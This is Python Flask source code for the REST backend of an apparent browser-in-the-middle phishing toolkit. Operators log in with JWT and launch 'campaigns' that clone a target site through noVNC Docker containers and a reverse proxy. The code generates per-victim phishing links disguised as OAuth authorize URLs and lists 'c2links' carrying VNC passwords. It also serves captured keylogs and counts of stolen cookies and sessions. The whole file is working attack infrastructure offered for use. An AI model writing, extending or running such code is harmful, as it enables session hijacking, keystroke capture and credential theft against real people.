"""REST API endpoints for the React frontend with JWT authentication."""
import os
import secrets
import uuid
import sqlite3
from datetime import datetime, timezone, timedelta
from functools import wraps

import jwt
from flask import Blueprint, jsonify, request, current_app
from werkzeug.security import check_password_hash, generate_password_hash

from ..models import db, AdminUser, Campaign, CampaignUser, Link, Keylog, Domain, CollectionLog
from .. import docker_manager
import docker.errors

rest_bp = Blueprint("rest_api", __name__, url_prefix="/api")


# ─── JWT helpers ────────────────────────────────────────────────────────────

def _make_token(user_id, expires_hours=24):
    payload = {
        "sub": user_id,
        "iat": datetime.now(timezone.utc),
        "exp": datetime.now(timezone.utc) + timedelta(hours=expires_hours),
    }
    return jwt.encode(payload, current_app.config["SECRET_KEY"], algorithm="HS256")


def _decode_token(token):
    return jwt.decode(token, current_app.config["SECRET_KEY"], algorithms=["HS256"])


def jwt_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer "):
            return jsonify({"detail": "Missing or invalid token"}), 401
        try:
            payload = _decode_token(auth[7:])
            user = db.session.get(AdminUser, payload["sub"])
            if not user:
                return jsonify({"detail": "User not found"}), 401
            request.current_user = user
        except jwt.ExpiredSignatureError:
            return jsonify({"detail": "Token expired"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"detail": "Invalid token"}), 401
        return f(*args, **kwargs)
    return wrapper


def _user_dict(user):
    return {
        "id": user.id,
        "username": user.username,
        "email": "",
        "full_name": user.username,
        "role_name": "admin",
        "is_active": True,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "telegram_chat_id": None,
    }


# ─── Auth endpoints ────────────────────────────────────────────────────────

@rest_bp.route("/auth/login", methods=["POST"])
def auth_login():
    data = request.get_json(silent=True) or {}
    username = data.get("username", "")
    password = data.get("password", "")
    user = AdminUser.query.filter_by(username=username).first()
    if not user or not check_password_hash(user.password_hash, password):
        return jsonify({"detail": "Invalid credentials"}), 401
    token = _make_token(user.id)
    return jsonify({"access_token": token, "user": _user_dict(user)})


@rest_bp.route("/auth/me", methods=["GET"])
@jwt_required
def auth_me():
    return jsonify(_user_dict(request.current_user))


# ─── Dashboard ──────────────────────────────────────────────────────────────

@rest_bp.route("/dashboard/stats", methods=["GET"])
@jwt_required
def dashboard_stats():
    campaigns = Campaign.query.all()
    active = [c for c in campaigns if c.status == "running"]
    all_users = CampaignUser.query.all()
    active_users = [u for u in all_users if u.status == "running"]

    recent = Campaign.query.order_by(Campaign.created_at.desc()).limit(5).all()
    return jsonify({
        "total_campaigns": len(campaigns),
        "active_campaigns": len(active),
        "total_sessions": len(all_users),
        "active_sessions": len(active_users),
        "recent_campaigns": [{
            "id": c.id,
            "name": c.name,
            "status": c.status,
            "created_at": c.created_at.isoformat() if c.created_at else "",
        } for c in recent],
    })


# ─── Campaigns CRUD ────────────────────────────────────────────────────────

def _campaign_dict(c):
    users = CampaignUser.query.filter_by(campaign_id=c.id).all()
    return {
        "id": c.id,
        "name": c.name,
        "description": "",
        "domain": c.domain,
        "target_url": c.target,
        "num_users": c.num_users,
        "browser_type": c.browser or "firefox",
        "ssl_enabled": c.ssl,
        "status": c.status,
        "created_by": "admin",
        "created_at": c.created_at.isoformat() if c.created_at else "",
        "updated_at": c.created_at.isoformat() if c.created_at else "",
        "sessions_count": len(users),
    }


@rest_bp.route("/campaigns", methods=["GET"])
@jwt_required
def list_campaigns():
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return jsonify({"campaigns": [_campaign_dict(c) for c in campaigns]})


@rest_bp.route("/campaigns", methods=["POST"])
@jwt_required
def create_campaign():
    data = request.get_json(silent=True) or {}
    campaign = Campaign(
        name=data.get("name", ""),
        domain=data.get("domain", ""),
        target=data.get("target_url", ""),
        num_users=int(data.get("num_users", 1)),
        ssl=data.get("ssl_enabled", False),
        browser=data.get("browser_type", "firefox"),
        admin_password=secrets.token_hex(16),
        status="created",
    )
    db.session.add(campaign)
    db.session.commit()
    return jsonify({"id": campaign.id, "message": "Campaign created"}), 201


@rest_bp.route("/campaigns/<int:cid>", methods=["GET"])
@jwt_required
def get_campaign(cid):
    c = Campaign.query.get_or_404(cid)
    return jsonify(_campaign_dict(c))


@rest_bp.route("/campaigns/<int:cid>", methods=["DELETE"])
@jwt_required
def delete_campaign(cid):
    campaign = Campaign.query.get_or_404(cid)
    if campaign.status == "running":
        users = CampaignUser.query.filter_by(campaign_id=cid).all()
        docker_manager.remove_campaign_containers(users)
    db.session.delete(campaign)
    db.session.commit()
    return jsonify({"message": "Campaign deleted"})


@rest_bp.route("/campaigns/<int:cid>/start", methods=["POST"])
@jwt_required
def start_campaign(cid):
    campaign = Campaign.query.get_or_404(cid)
    if campaign.status == "running":
        return jsonify({"detail": "Campaign already running"}), 400

    ok, msg = docker_manager.check_docker_available()
    if not ok:
        return jsonify({"detail": f"Docker not available: {msg}"}), 500

    if campaign.browser == "chrome":
        required_images = ["cvnc-docker", "cmvnc-docker", "rev-proxy"]
    else:
        required_images = ["vnc-docker", "mvnc-docker", "rev-proxy"]
    for img in required_images:
        if not docker_manager.check_image_exists(img):
            return jsonify({"detail": f"Docker image '{img}' not found"}), 500

    output_dir = current_app.config["OUTPUT_DIR"]
    ico_path = os.path.join(output_dir, "novnc.ico")

    campaign.page_title = docker_manager.fetch_page_title(campaign.target)
    docker_manager.fetch_favicon(campaign.target, ico_path)
    db.session.commit()

    scheme = "https"
    campaign_users = []
    created_containers = []

    try:
        for i in range(1, campaign.num_users + 1):
            token = str(uuid.uuid4())
            vnc_num = i * 2 - 1
            mvnc_num = i * 2

            vnc_name, vnc_pw, _ = docker_manager.create_vnc_container(vnc_num, is_mobile=False, browser=campaign.browser)
            created_containers.append(vnc_name)
            mvnc_name, mvnc_pw, _ = docker_manager.create_vnc_container(mvnc_num, is_mobile=True, browser=campaign.browser)
            created_containers.append(mvnc_name)

            vnc_ip = docker_manager.configure_vnc_container(
                vnc_name, is_mobile=False, useragent=campaign.useragent,
                page_title=campaign.page_title, target=campaign.target,
                domain=campaign.domain, ssl=campaign.ssl,
                redirect=campaign.redirect, ico_path=ico_path,
                browser=campaign.browser
            )
            mvnc_ip = docker_manager.configure_vnc_container(
                mvnc_name, is_mobile=True, useragent=campaign.useragent,
                page_title=campaign.page_title, target=campaign.target,
                domain=campaign.domain, ssl=campaign.ssl,
                redirect=campaign.redirect, ico_path=ico_path,
                browser=campaign.browser
            )

            cu = CampaignUser(
                campaign_id=campaign.id, user_num=i,
                vnc_container=vnc_name, mvnc_container=mvnc_name,
                vnc_password=vnc_pw, mvnc_password=mvnc_pw,
                vnc_ip=vnc_ip or "", mvnc_ip=mvnc_ip or "",
                token=token, status="running",
            )
            db.session.add(cu)
            campaign_users.append(cu)

            if campaign.custom_param:
                url = f"{scheme}://{campaign.domain}/v{i}/{campaign.custom_param}"
            else:
                url = f"{scheme}://{campaign.domain}/v{i}/oauth2/authorize?access-token={token}"
            db.session.add(Link(campaign_id=campaign.id, user_num=i, url=url))

        db.session.commit()

        admin_pw = campaign.admin_password or secrets.token_hex(16)
        campaign.admin_password = admin_pw
        success, message = docker_manager.start_rev_proxy(campaign, campaign_users, admin_pw, ico_path=ico_path)
        if not success:
            raise RuntimeError(f"Rev-proxy failed: {message}")
        created_containers.append("rev-proxy")

        campaign.status = "running"
        db.session.commit()
        return jsonify({"message": f"Campaign launched with {campaign.num_users} user(s)"})

    except Exception as e:
        db.session.rollback()
        client = docker_manager.get_client()
        for name in created_containers:
            try:
                client.containers.get(name).remove(force=True)
            except Exception:
                pass
        CampaignUser.query.filter_by(campaign_id=campaign.id).delete()
        Link.query.filter_by(campaign_id=campaign.id).delete()
        db.session.commit()
        return jsonify({"detail": f"Launch failed: {e}"}), 500


@rest_bp.route("/campaigns/<int:cid>/stop", methods=["POST"])
@jwt_required
def stop_campaign(cid):
    campaign = Campaign.query.get_or_404(cid)
    users = CampaignUser.query.filter_by(campaign_id=cid).all()
    docker_manager.remove_campaign_containers(users)
    campaign.status = "stopped"
    for u in users:
        u.status = "disconnected"
    db.session.commit()
    return jsonify({"message": "Campaign stopped"})


@rest_bp.route("/campaigns/<int:cid>/sessions", methods=["GET"])
@jwt_required
def campaign_sessions(cid):
    Campaign.query.get_or_404(cid)
    users = CampaignUser.query.filter_by(campaign_id=cid).all()
    sessions = []
    for u in users:
        # Desktop session
        sessions.append({
            "id": u.id * 2 - 1,
            "user_num": u.user_num,
            "container_name": u.vnc_container,
            "container_type": "desktop",
            "status": u.status,
            "ip_address": u.vnc_ip,
            "user_agent": "",
            "created_at": "",
            "last_activity": "",
        })
        # Mobile session
        sessions.append({
            "id": u.id * 2,
            "user_num": u.user_num,
            "container_name": u.mvnc_container,
            "container_type": "mobile",
            "status": u.status,
            "ip_address": u.mvnc_ip,
            "user_agent": "",
            "created_at": "",
            "last_activity": "",
        })
    return jsonify({"sessions": sessions})


@rest_bp.route("/campaigns/<int:cid>/stats", methods=["GET"])
@jwt_required
def campaign_stats(cid):
    campaign = Campaign.query.get_or_404(cid)
    users = CampaignUser.query.filter_by(campaign_id=cid).all()
    active = [u for u in users if u.status == "running"]
    return jsonify({
        "campaign_id": cid,
        "campaign_name": campaign.name,
        "total_sessions": len(users) * 2,
        "active_sessions": len(active) * 2,
        "desktop_sessions": len(users),
        "mobile_sessions": len(users),
        "browser_type": campaign.browser or "firefox",
        "domain": campaign.domain,
        "status": campaign.status,
    })


# ─── Sessions & Logs (global) ──────────────────────────────────────────────

@rest_bp.route("/sessions", methods=["GET"])
@jwt_required
def all_sessions():
    users = CampaignUser.query.all()
    sessions = []
    for u in users:
        sessions.append({
            "id": u.id * 2 - 1,
            "user_num": u.user_num,
            "container_name": u.vnc_container,
            "container_type": "desktop",
            "status": u.status,
            "ip_address": u.vnc_ip,
            "user_agent": "",
            "created_at": "",
            "last_activity": "",
        })
        sessions.append({
            "id": u.id * 2,
            "user_num": u.user_num,
            "container_name": u.mvnc_container,
            "container_type": "mobile",
            "status": u.status,
            "ip_address": u.mvnc_ip,
            "user_agent": "",
            "created_at": "",
            "last_activity": "",
        })
    return jsonify({"sessions": sessions})


@rest_bp.route("/logs", methods=["GET"])
@jwt_required
def all_logs():
    logs_list = []
    keylogs = Keylog.query.order_by(Keylog.updated_at.desc()).limit(100).all()
    for k in keylogs:
        logs_list.append({
            "id": k.id,
            "session_id": k.user_num,
            "log_type": "keylog",
            "content": k.content[:200] if k.content else "",
            "created_at": k.updated_at.isoformat() if k.updated_at else "",
        })

    clogs = CollectionLog.query.order_by(CollectionLog.timestamp.desc()).limit(100).all()
    for cl in clogs:
        logs_list.append({
            "id": cl.id + 100000,
            "session_id": cl.campaign_id,
            "log_type": "cookie",
            "content": f"Collected {cl.cookies_count} cookies, {cl.sessions_count} sessions",
            "created_at": cl.timestamp.isoformat() if cl.timestamp else "",
        })

    logs_list.sort(key=lambda x: x["created_at"], reverse=True)
    return jsonify({"logs": logs_list[:100]})


# ─── Domains ───────────────────────────────────────────────────────────────

@rest_bp.route("/domains", methods=["GET"])
@jwt_required
def list_domains():
    domains = Domain.query.filter_by(purpose="campaign").order_by(Domain.name).all()
    return jsonify({"domains": [{
        "id": d.id,
        "name": d.name,
        "ssl_enabled": d.ssl_enabled,
        "verified": d.verified,
        "cert_method": d.cert_method,
    } for d in domains]})


# ─── Campaign Links + VNC ──────────────────────────────────────────────────

@rest_bp.route("/campaigns/<int:cid>/c2links", methods=["GET"])
@jwt_required
def campaign_links(cid):
    campaign = Campaign.query.get_or_404(cid)
    links = Link.query.filter_by(campaign_id=cid).order_by(Link.user_num).all()
    users = CampaignUser.query.filter_by(campaign_id=cid).order_by(CampaignUser.user_num).all()

    # Build a map of user_num -> CampaignUser
    user_map = {u.user_num: u for u in users}

    result = []
    for link in links:
        cu = user_map.get(link.user_num)
        vnc_url = None
        mvnc_url = None
        if cu and cu.vnc_container:
            c = cu.vnc_container
            pw = cu.vnc_password
            vnc_url = f"/vnc/{c}/conn.html?autoconnect=true&password={pw}&path=vnc/{c}/websockify&resize=remote"
        if cu and cu.mvnc_container:
            mc = cu.mvnc_container
            mpw = cu.mvnc_password
            mvnc_url = f"/vnc/{mc}/conn.html?autoconnect=true&password={mpw}&path=vnc/{mc}/websockify&resize=scale"

        # Extract access-token from URL for display
        url_token = cu.token if cu and cu.token else ""
        short_token = url_token[:8] if url_token else link.url[-8:]

        result.append({
            "link_id": link.id,
            "user_num": link.user_num,
            "url_token": url_token,
            "short_token": short_token,
            "phishing_url": link.url,
            "click_count": link.click_count,
            "desktop_container": cu.vnc_container if cu else None,
            "mobile_container": cu.mvnc_container if cu else None,
            "desktop_vnc_url": vnc_url,
            "mobile_vnc_url": mvnc_url,
            "status": cu.status if cu else "pending",
        })

    return jsonify({"links": result, "campaign_status": campaign.status})


# ─── Telegram (stub) ───────────────────────────────────────────────────────

@rest_bp.route("/telegram/status", methods=["GET"])
@jwt_required
def telegram_status():
    return jsonify({
        "is_connected": False,
        "chat_id": None,
        "username": None,
        "commands": [],
    })


@rest_bp.route("/telegram/link", methods=["POST"])
@jwt_required
def telegram_link():
    return jsonify({"message": "Telegram linking not yet configured"}), 200


# ─── Settings (stub) ───────────────────────────────────────────────────────

@rest_bp.route("/settings", methods=["GET"])
@jwt_required
def get_settings():
    return jsonify({
        "notifications": {"email": False, "telegram": False},
        "security": {"two_factor": False, "session_timeout": 30},
        "appearance": {"theme": "dark", "language": "en"},
    })


@rest_bp.route("/settings", methods=["PUT"])
@jwt_required
def update_settings():
    return jsonify({"message": "Settings updated"})


# ─── User profile ──────────────────────────────────────────────────────────

@rest_bp.route("/users/profile", methods=["PUT"])
@jwt_required
def update_profile():
    return jsonify({"message": "Profile updated"})


@rest_bp.route("/users/password", methods=["PUT"])
@jwt_required
def update_password():
    data = request.get_json(silent=True) or {}
    user = request.current_user
    current = data.get("current_password", "")
    new_pw = data.get("new_password", "")
    if not check_password_hash(user.password_hash, current):
        return jsonify({"detail": "Current password is incorrect"}), 400
    if len(new_pw) < 6:
        return jsonify({"detail": "New password too short"}), 400
    user.password_hash = generate_password_hash(new_pw)
    db.session.commit()
    return jsonify({"message": "Password updated"})
